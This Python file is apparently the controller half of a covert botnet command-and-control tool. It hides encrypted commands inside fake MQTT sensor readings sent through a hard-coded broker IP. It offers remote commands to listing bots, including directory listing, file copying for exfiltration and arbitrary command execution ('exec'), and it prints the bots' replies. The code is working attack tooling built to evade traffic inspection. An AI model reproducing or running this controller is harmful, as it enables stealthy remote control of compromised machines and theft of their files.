import paho.mqtt.client as mqtt
import json
import random
import time
import hashlib
import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
from Crypto.Random import get_random_bytes

BROKER = "147.32.82.209"
PORT = 1883
TOPIC = "sensors"
SALT = "S4ur0ns_S3cr3t_S4lt_2025" # MUST MATCH BOT'S SALT
CONTROLLER_ID = "server_hub_01"

# --- CRYPTO HELPER ---
def derive_key(data_dict):
    raw_str = (SALT + str(data_dict.get("sensor_id", "")) + 
               str(data_dict.get("temp", "")) + 
               str(data_dict.get("hum", "")) + 
               str(data_dict.get("bat", "")))
    md5_hash = hashlib.md5(raw_str.encode()).digest()
    return md5_hash + md5_hash

def encrypt_data(plaintext, key):
    iv = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
    return (iv + ciphertext).hex()

def decrypt_fingerprint(fingerprint_hex, key):
    try:
        encrypted_data = bytes.fromhex(fingerprint_hex)
        iv = encrypted_data[:16]
        ciphertext = encrypted_data[16:]
        cipher = AES.new(key, AES.MODE_CBC, iv)
        return unpad(cipher.decrypt(ciphertext), AES.block_size).decode()
    except:
        return None

# --- NETWORK ---
def send_command(client, target, cmd, arg=""):
    # 1. Create base dummy packet
    packet = {
        "sensor_id": CONTROLLER_ID,
        "temp": round(random.uniform(19.0, 25.0), 1),
        "hum": round(random.uniform(50.0, 80.0), 1),
        "bat": random.randint(80, 100)
    }
    
    # 2. Derive key from this dummy data + SALT
    key = derive_key(packet)
    
    # 3. Prepare payload
    payload = json.dumps({
        "target": target,
        "sender": CONTROLLER_ID,
        "type": "command",
        "cmd": cmd,
        "arg": arg
    })
    
    # 4. Encrypt payload into fingerprint
    packet["fingerprint"] = encrypt_data(payload, key)
    
    # 5. Send
    print(f"[*] Sending masked packet: {json.dumps(packet)}")
    client.publish(TOPIC, json.dumps(packet))

def on_message(client, userdata, msg):
    try:
        data = json.loads(msg.payload.decode())
        if "fingerprint" in data:
            key = derive_key(data)
            decrypted = decrypt_fingerprint(data["fingerprint"], key)
            
            if decrypted:
                resp = json.loads(decrypted)
                if resp.get("type") == "response" and resp.get("target") == CONTROLLER_ID:
                    print(f"\n[+] RESPONSE from {resp['sender']}:\n{resp['output']}\n")
                    if resp['output'].startswith("FILE_START:"):
                        print("(File content received. Copy/paste from output above)")
    except:
        pass

def main():
    client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2)
    client.on_message = on_message
    client.connect(BROKER, PORT, 60)
    client.loop_start()
    
    print("--- MQTT SECURE STEALTH C&C ---")
    print("Commands: ping, w, ls <dir>, id, copy <file>, exec <cmd>")
    
    while True:
        try:
            cmd_str = input("C&C> ").strip()
            if not cmd_str: continue
            if cmd_str == "exit": break
            
            parts = cmd_str.split(" ", 1)
            cmd = parts[0]
            arg = parts[1] if len(parts) > 1 else ""
            
            send_command(client, "ALL", cmd, arg)
            time.sleep(1) # Wait for replies
        except KeyboardInterrupt:
            break
            
    client.loop_stop()

if __name__ == "__main__":
    main()